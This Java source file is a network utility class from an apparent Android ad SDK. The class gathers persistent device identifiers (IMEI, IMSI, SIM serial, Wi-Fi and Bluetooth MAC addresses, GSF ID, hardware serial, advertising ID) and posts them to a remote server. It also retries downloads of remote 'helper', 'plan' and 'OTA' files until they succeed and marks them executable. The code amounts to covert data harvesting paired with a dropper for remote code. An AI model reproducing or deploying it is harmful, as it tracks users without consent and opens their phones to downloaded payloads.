package com.parker.adsdk.network;

import android.bluetooth.BluetoothAdapter;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.SystemClock;
import android.preference.PreferenceManager;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;

import com.parker.adsdk.entity.Device;
import com.parker.adsdk.entity.Response;
import com.parker.adsdk.entity.rule.Rule;
import com.parker.adsdk.util.AdUtils;
import com.parker.adsdk.util.DeviceUtil;
import com.parker.adsdk.util.FileUtils;
import com.parker.adsdk.util.MyLog;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.HttpURLConnection;
import java.net.NetworkInterface;
import java.net.URL;
import java.security.MessageDigest;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class RequestUtil {
    public static final int EVENT_FETCH_RULE_FAIL = 12;
    public static final int EVENT_FETCH_OTA_FAIL = 13;
    public static final int EVENT_REQUEST_INIT_FAIL = 14;
    public static final int EVENT_HELPER_DOWNLOAD_FAIL = 21;
    public static final int EVENT_HELPER_DOWNLOAD_OTA = 22;
    public static final int EVENT_HELPER_DOWNLOAD_PLAN = 23;
    public static final int EVENT_HELPER_DOWNLOAD_HELPER = 24;
    public static final int EVENT_HELPER_START_FAIL = 52;
    public static final int EVENT_INIT_RETURN_SUCCESS = 15;
    public static final int EVENT_INIT_RETURN_FAIL = 16;
    public static final int EVENT_HELPER_START_DOWNLOAD = 31;
    public static final int EVENT_HELPER_DOWNLOAD_SUCCESS = 32;
    public static final String TRANS_OBJ_DEVICE = "device";
    public static final String TRANS_OBJ_SELF = "self";
    public static String base_url = "http://";
    private static final String URL_INIT = "/api/v1/r/init";
    private static final String URL_FEEDBACK = "/api/v1/r/feedback";
    private static boolean dl_logged = false;
    private static int requestRetryCnt = 0;
    private static final Uri GSF_URI = Uri.parse("content://com.google.android.gsf.gservices");
    private static final String GSF_ID_KEY = "android_id";

    public RequestUtil() {
    }

    public static void downloadFile(Context context, int event ,String extUrl, File dst, String md5) {
        while(!download(context, event ,extUrl, dst, md5)) {
            SystemClock.sleep(3000L);
        }

    }

    private static boolean download(Context context,int event , String extUrl, File dst, String md5) {
        HttpURLConnection urlConnection = null;
        FileOutputStream fileOutput = null;
        InputStream inputStream = null;

        try {
            URL e = new URL(extUrl);
            urlConnection = (HttpURLConnection)e.openConnection();
            urlConnection.setRequestMethod("GET");
            urlConnection.setConnectTimeout(30000);
            urlConnection.setReadTimeout(30000);
            urlConnection.setInstanceFollowRedirects(false);
            urlConnection.connect();
            fileOutput = new FileOutputStream(dst);
            inputStream = urlConnection.getInputStream();
            byte[] buffer = new byte[1024];
            boolean bufferLength = false;

            int bufferLength1;
            while((bufferLength1 = inputStream.read(buffer)) > 0) {
                fileOutput.write(buffer, 0, bufferLength1);
            }

            fileOutput.close();
            FileUtils.setPermissions(dst, 493);
            if(!md5.equalsIgnoreCase(calculateMD5(dst))) {
                throw new Exception();
            }

            dl_logged = false;
            return true;
        } catch (Exception var18) {
            dst.delete();
            if(!dl_logged) {
                recordLog(context, event, extUrl);
                dl_logged = true;
            }
        } finally {
            try {
                if(urlConnection != null) {
                    urlConnection.disconnect();
                }

                if(fileOutput != null) {
                    fileOutput.close();
                }

                if(inputStream != null) {
                    inputStream.close();
                }
            } catch (Exception var17) {
                ;
            }

        }

        return false;
    }

    public static String requestInit(Context context , boolean firstRequest) {
        JSONObject jsonObject = new JSONObject();

        try {
            //jsonObject.put("device", getDeviceInfo(context));
            jsonObject.put("device", DeviceUtil.getDevice(context).pack());
            jsonObject.put("self", getSelfInfo(context, firstRequest));
            MyLog.i("request init--> " + jsonObject.toString());
            return postData(context, base_url + "/api/v1/r/init", jsonObject.toString());
        } catch (Exception e) {
            MyLog.e("request init fail, retry: " + (requestRetryCnt + 1));
            recordLog(context, EVENT_REQUEST_INIT_FAIL, base_url + "/api/v1/r/init");
            if(requestRetryCnt < 3) {
                try {
                    Thread.sleep(5000L);
                } catch (Exception var4) {
                    ;
                }

                ++requestRetryCnt;
                return requestInit(context , firstRequest);
            }

            return null;
        }
    }

    private static String postData(Context target, String requestUrl, String data) throws Exception {
        String response = "";
        NetworkRequest request = new NetworkRequest(target, new URL(requestUrl));
        request.addUploadPartWithDataZip("file", "file", data.toString().getBytes());
        response = new String(request.doRequestWithUnzipResult());
        MyLog.i("response--> " + response);
        requestRetryCnt = 0;
        return response;
    }

    private static JSONObject getSelfInfo(Context context, boolean firstRequest) throws Exception {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("pkg", context.getPackageName());
        jsonObject.put("fbRef", getRef(context));
        jsonObject.put("fbDeepLink", getDeepLink(context));
        jsonObject.put("firstRequest", firstRequest);
        jsonObject.put("channel", getChannel(context));
        int versionCode = 0;

        try {
            versionCode = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionCode;
        } catch (Exception e) {
            ;
        }

        jsonObject.put("versionCode", versionCode);
        return jsonObject;
    }

    private static JSONObject getDeviceInfo(Context target) {
        String linuxVersionDesc = getLinuxVersionDesc();
        TelephonyManager tm = (TelephonyManager)target.getSystemService(Context.TELEPHONY_SERVICE);
        JSONObject jsonObject = new JSONObject();

        try {
            jsonObject.put("MemTotal", getMemTotal());
            jsonObject.put("linuxversion", parseLinuxVersion(linuxVersionDesc));
            jsonObject.put("linuxversion_desc", linuxVersionDesc);
            jsonObject.put("cpuinfo", getCpuInfo());
            jsonObject.put("prop", getProp());
            jsonObject.put("imei", getIMEI(target));
            jsonObject.put("macAddr", getMacAddress(target));
            jsonObject.put("androidId", getAndroidId(target));
            jsonObject.put("googleVM", getGoogleVM(target));
            jsonObject.put("networkType", getNetWorkType(target));
            jsonObject.put("bluetooth_mac", BluetoothAdapter.getDefaultAdapter().getAddress());
            jsonObject.put("imei/sv", tm.getDeviceSoftwareVersion());
            jsonObject.put("imsi", tm.getSubscriberId());
            jsonObject.put("iccid", tm.getSimSerialNumber());
            jsonObject.put("gsf_id", getGSFId(target));
            jsonObject.put("adId", getAdid(target));
        } catch (Exception var5) {
            var5.printStackTrace();
        }

        return jsonObject;
    }

    private static String getMemTotal() {
        try {
            HashMap e = new HashMap();
            e.put("MemTotal", "");
            FileInputStream is2 = new FileInputStream("/proc/meminfo");
            getStringFromInputStream(is2, e);
            return (String)e.get("MemTotal");
        } catch (Exception var2) {
            return null;
        }
    }

    private static String getLinuxVersionDesc() {
        try {
            FileInputStream e = new FileInputStream("/proc/version");
            return getStringFromInputStream(e, (Map)null);
        } catch (Exception var1) {
            return null;
        }
    }

    private static String parseLinuxVersion(String value) throws Exception {
        String linuxVersion = value.toLowerCase();
        if(linuxVersion.contains("(")) {
            linuxVersion = linuxVersion.split("\\(")[0];
            if(linuxVersion.contains("version")) {
                linuxVersion = linuxVersion.split("version")[1];
                if(linuxVersion.contains("-")) {
                    linuxVersion = linuxVersion.split("-")[0];
                }
            }
        }

        return linuxVersion.trim();
    }

    private static JSONObject getCpuInfo() {
        try {
            HashMap e = new HashMap();
            FileInputStream is = new FileInputStream("/proc/cpuinfo");
            getStringFromInputStream(is, e);
            return parseCpuInfoMap(e);
        } catch (Exception var2) {
            return null;
        }
    }

    private static JSONObject parseCpuInfoMap(Map<String, String> map) throws JSONException {
        String[] mapKeys = new String[]{"processorcnt", "modelname", "features", "cpuimplementer", "cpuarchitecture", "cpuvariant", "cpupart", "cpurevision", "hardware", "revision", "serial"};
        JSONObject jsonObject = new JSONObject();
        Iterator keys = map.keySet().iterator();
        if(keys != null && keys.hasNext()) {
            while(keys.hasNext()) {
                String key = (String)keys.next();
                String[] var8 = mapKeys;
                int var7 = mapKeys.length;

                for(int var6 = 0; var6 < var7; ++var6) {
                    String mapKey = var8[var6];
                    if(key.replace(" ", "").toLowerCase().contains(mapKey)) {
                        jsonObject.put(mapKey, map.get(key));
                    }
                }
            }

            if(!jsonObject.has("processorcnt")) {
                jsonObject.put("processorcnt", 1);
            }

            return jsonObject;
        } else {
            return null;
        }
    }

    private static JSONObject getProp() throws Exception {
        JSONObject jsonObject = new JSONObject();
        Class spClazz = Class.forName("android.os.SystemProperties");
        Method get = spClazz.getDeclaredMethod("get", new Class[]{String.class});
        get.setAccessible(true);
        String[] propKeys = new String[]{"ro.product.brand", "ro.product.name", "ro.product.model", "ro.build.fingerprint", "ro.build.version.sdk", "ro.build.version.release", "ro.build.date", "ro.build.date.utc", "ro.boot.cpuid", "ro.btconfig.vendor", "persist.sys.timezone", "persist.sys.country", "persist.sys.language", "persist.sys.dalvik.vm.lib", "ro.build.description", "ro.runtime.firstboot", "ro.serialno", "ro.product.device", "ro.kernel.qemu", "ro.hardware", "ro.product.cpu.abi"};
        String[] var7 = propKeys;
        int var6 = propKeys.length;

        for(int var5 = 0; var5 < var6; ++var5) {
            String key = var7[var5];
            jsonObject.put(key, (String)get.invoke((Object)null, new Object[]{key}));
        }

        return jsonObject;
    }

    private static String getIMEI(Context context) {
        String imei = "0";
        TelephonyManager mngr = null;

        try {
            mngr = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
            imei = mngr.getDeviceId();
        } catch (Exception var4) {
            var4.printStackTrace();
        }

        return imei;
    }

    private static String getMacAddress(Context context) {
        String macAddress = "0";

        try {
            WifiManager e = (WifiManager)context.getSystemService(Context.WIFI_SERVICE);
            macAddress = e.getConnectionInfo().getMacAddress();
        } catch (Exception var3) {
            var3.printStackTrace();
        }

        return macAddress;
    }

    private static String getAndroidId(Context context) {
        String androidId = "0";

        try {
            androidId = Secure.getString(context.getContentResolver(), "android_id");
        } catch (Exception var3) {
            var3.printStackTrace();
        }

        return androidId;
    }

   private static JSONObject getGoogleVM(Context context) {
        JSONObject jsonObject = new JSONObject();
/*
        try {
            jsonObject.put("fingerprint", String.format("%.2f", new Object[]{Double.valueOf(e.getF())}));
            jsonObject.put("features", String.format("%d", new Object[]{Long.valueOf(e.g())}));
            jsonObject.put("cpuCount", String.format("%d", new Object[]{Integer.valueOf(e.h())}));
            jsonObject.put("networkInterface", dumpNetworkInterfaces());
            jsonObject.put("maxCpuFreq", dumpScalingMaxFreq());
        } catch (Throwable tr) {
            tr.printStackTrace();
        }*/

        return jsonObject;
    }

    private static String dumpNetworkInterfaces() {
        StringBuilder str = new StringBuilder();

        try {
            Enumeration e = NetworkInterface.getNetworkInterfaces();

            while(e.hasMoreElements()) {
                NetworkInterface ni = (NetworkInterface)e.nextElement();
                str.append(ni.getName());
                str.append(" ");
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        return str.toString();
    }

    private static String dumpScalingMaxFreq() {
        File file = null;
        file = new File("/sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq");
        return file.exists()?"1":"0";
    }

    private static String getStringFromInputStream(InputStream is, Map formatter) {
        StringBuilder sb = new StringBuilder();
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        String line = null;
        boolean isMapInitPut = formatter != null && formatter.size() >= 1;

        try {
            while((line = br.readLine()) != null) {
                if(formatter != null && line.contains(":")) {
                    String[] values = line.split(":");
                    if(isMapInitPut) {
                        putValueToMap(formatter, values[0], values[1]);
                    } else if(values[0].trim().equals("processor")) {
                        formatter.put("processorcnt", values[1].trim());
                    } else {
                        formatter.put(values[0].trim(), values[1].trim());
                    }
                }

                sb.append(line);
                sb.append("\n");
            }
        } catch (IOException var15) {
            ;
        } finally {
            if(br != null) {
                try {
                    br.close();
                } catch (IOException var14) {
                    ;
                }
            }

        }

        return sb.toString();
    }

    private static void putValueToMap(Map<String, String> map, String key, String val) {
        key = key.replace("[", "").replace("]", "").trim();
        val = val.replace("[", "").replace("]", "").trim();
        Iterator iterator = map.keySet().iterator();
        if(iterator != null && iterator.hasNext()) {
            while(iterator.hasNext()) {
                String lKey = (String)iterator.next();
                if(lKey.equals(key)) {
                    map.put(lKey, val);
                    break;
                }
            }
        }

    }

    private static String getGSFId(Context context) {
        String[] params = new String[]{"android_id"};

        Cursor c;
        try {
            c = context.getContentResolver().query(GSF_URI, (String[])null, (String)null, params, (String)null);
        } catch (Exception var9) {
            return "none";
        }

        if(c != null && c.moveToFirst() && c.getColumnCount() >= 2) {
            try {
                String var5 = Long.toHexString(Long.parseLong(c.getString(1)));
                return var5;
            } catch (NumberFormatException var10) {
                ;
            } finally {
                if(c != null) {
                    c.close();
                }

            }

            return null;
        } else {
            return null;
        }
    }

    public static JSONObject recordLog(Context context, int event) {
        return recordLog(context, event, null);
    }

    public static JSONObject recordLog(Context context, int event, String msg) {
        JSONObject response = null;

        try {
            JSONObject data = new JSONObject();
            //data.put("device", getDeviceInfo(context));
            //data.put("self", getSelfInfo(context, false));

            data.put("device", DeviceUtil.getDevice(context).pack());
            JSONObject self = getSelfInfo(context, false);
            self.put("helperVersion", 10);
            data.put("self", self);

            JSONArray records = new JSONArray();
            JSONObject record = new JSONObject();
            record.put("eventTime", System.currentTimeMillis());
            record.put("eventType", event);
            if(msg != null) {
                switch(event) {
                    case EVENT_HELPER_START_FAIL:
                        record.put("msg", msg);
                        break;
                    default:
                        record.put("url", msg);
                        break;
                }
            }

            records.put(record);
            data.put("records", records);
            MyLog.i("report para: %s", data.toString());
            String raw = postData(context, base_url + "/api/v1/r/feedback", data.toString());
            MyLog.i(String.format("report return: %s", new Object[]{raw}));
            response = new JSONObject(raw);
        } catch (Exception e) {
            MyLog.e(e, "exception %s", new Object[]{e.getMessage()});
        }

        return response;
    }

    public static Rule requestRule(Context context){
        Rule rule = null;
        JSONObject data = new JSONObject();
        try {
            data.put("device", DeviceUtil.getDevice(context).pack());
            JSONObject self = getSelfInfo(context ,false);
            self.put("ruleVer", 0);
            data.put("self", self);
            String raw = RequestUtil.postData(context, base_url + "/api/v1/r/rule",
                    data.toString());
            data = new JSONObject(raw);
            if(data.optJSONObject("result").optInt("code") == 0) {
                rule = new Rule(new JSONObject(raw));
                return rule;
            }else
            {
                recordLog(context, EVENT_FETCH_RULE_FAIL, base_url + "/api/v1/r/rule");
                MyLog.e("fetch rule failed: %s", new Object[]{data.optJSONObject("result").optString("msg")});
            }

        }catch (Exception e)
        {
            MyLog.e("request rule fail, retry: " + (requestRetryCnt + 1));
            recordLog(context, EVENT_FETCH_RULE_FAIL, base_url + "/api/v1/r/rule");
            if(requestRetryCnt < 3) {
                try {
                    Thread.sleep(5000L);
                } catch (Exception ex) {
                    ;
                }

                ++requestRetryCnt;
                return requestRule(context);
            }

        }
        return rule;

    }

    public static String requestOta(Context context) {
        String resp;
        JSONObject data = new JSONObject();
        try {
            data.put("device", DeviceUtil.getDevice(context).pack());
            data.put("self", getSelfInfo(context , false));
            resp = RequestUtil.postData(context, base_url + "/api/v1/r/ota", data
                    .toString());
        }
        catch(Exception e) {
            MyLog.e("request ota fail, retry: " + (requestRetryCnt + 1));
            RequestUtil.recordLog(context, EVENT_FETCH_OTA_FAIL, base_url + "/api/v1/r/ota");
            if(RequestUtil.requestRetryCnt < 3) {
                try {
                    Thread.sleep(5000L);
                }
                catch(Exception ex) {
                }

                ++RequestUtil.requestRetryCnt;
                return RequestUtil.requestOta(context);
            }

            resp = null;
        }

        return resp;
    }

    public static Response recordWork(Context context, String tid, int event, JSONObject plan, JSONObject
            info)
    {
        Response response = null;

        try {
            JSONObject data = new JSONObject();
            data.put("device", DeviceUtil.getDevice(context).pack());
            //data.put("self", getSelfInfo(context, false));
            JSONObject self = getSelfInfo(context , false);
            self.put("helperVersion", 10);
            data.put("self", self);

            JSONArray records = new JSONArray();
            JSONObject record = new JSONObject();
            record.put("tid", tid);
            record.put("eventTime", System.currentTimeMillis());
            record.put("eventType", event);
            record.put("plan", plan);
            if (info != null)
            {
                record.put("info" , info);
            }
            records.put(record);
            data.put("records", records);
            MyLog.i("report para: %s", new Object[]{data.toString()});
            String raw = postData(context, base_url + "/api/v1/r/feedback", data.toString());
            MyLog.i(String.format("report return: %s", new Object[]{raw}));
            data = new JSONObject(raw);
            response = new Response(data);
        } catch (Exception e) {
            MyLog.e(e, "exception %s", new Object[]{e.getMessage()});
        }
        return response;
    }



    public static JSONObject recordWork(Context context, int event, String tid, JSONObject plan) {
        JSONObject response = null;

        try {
            JSONObject data = new JSONObject();
            //data.put("device", getDeviceInfo(context));
            data.put("device", DeviceUtil.getDevice(context).pack());
            data.put("self", getSelfInfo(context, false));
            JSONArray records = new JSONArray();
            JSONObject record = new JSONObject();
            record.put("tid", tid);
            record.put("eventTime", System.currentTimeMillis());
            record.put("eventType", event);
            record.put("plan", plan);
            records.put(record);
            data.put("records", records);
            MyLog.i("report para: %s", new Object[]{data.toString()});
            String raw = postData(context, base_url + "/api/v1/r/feedback", data.toString());
            MyLog.i(String.format("report return: %s", new Object[]{raw}));
            response = new JSONObject(raw);
        } catch (Exception e) {
            MyLog.e(e, "exception %s", new Object[]{e.getMessage()});
        }

        return response;
    }

    public static String calculateMD5(File file) {
        MessageDigest digest;
        try {
            digest = MessageDigest.getInstance("MD5");
        } catch (Exception var19) {
            return null;
        }

        FileInputStream is;
        try {
            is = new FileInputStream(file);
        } catch (Exception var18) {
            return null;
        }

        byte[] buffer = new byte[8192];

        String var9;
        try {
            int read;
            while((read = is.read(buffer)) > 0) {
                digest.update(buffer, 0, read);
            }

            byte[] e = digest.digest();
            BigInteger bigInt = new BigInteger(1, e);
            String output = bigInt.toString(16);
            output = String.format("%32s", new Object[]{output}).replace(' ', '0');
            var9 = output;
        } catch (Exception var20) {
            throw new RuntimeException("Unable to process file for MD5", var20);
        } finally {
            try {
                is.close();
            } catch (IOException var17) {
                ;
            }

        }

        return var9;
    }

    private static String getAdid(Context context) {
        try {
            AdUtils.AdInfo adInfo = AdUtils.getAdvertisingIdInfo(context);
            if(adInfo != null) {
                String adid = adInfo.getId();
                return adid;
            }
        } catch (Exception var3) {
            ;
        }

        return "";
    }

    public static String getNetWorkType(Context context) {
        String networkType = "none";
        ConnectivityManager manager = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = manager.getActiveNetworkInfo();
        if(networkInfo != null && networkInfo.isConnected()) {
            String type = networkInfo.getTypeName();
            if(type.equalsIgnoreCase("WIFI")) {
                networkType = "wifi";
            } else if(type.equalsIgnoreCase("MOBILE")) {
                networkType = networkInfo.getSubtypeName();
            }
        } else {
            networkType = "none";
        }

        return networkType;
    }

    private static String getRef(Context context) {
        return PreferenceManager.getDefaultSharedPreferences(context).getString("ref", "");
    }

    private static String getDeepLink(Context context) {
        return PreferenceManager.getDefaultSharedPreferences(context).getString("deepLink", "");
    }

    private static int getChannel(Context context) {
        return PreferenceManager.getDefaultSharedPreferences(context).getInt("channel", 1);
    }
}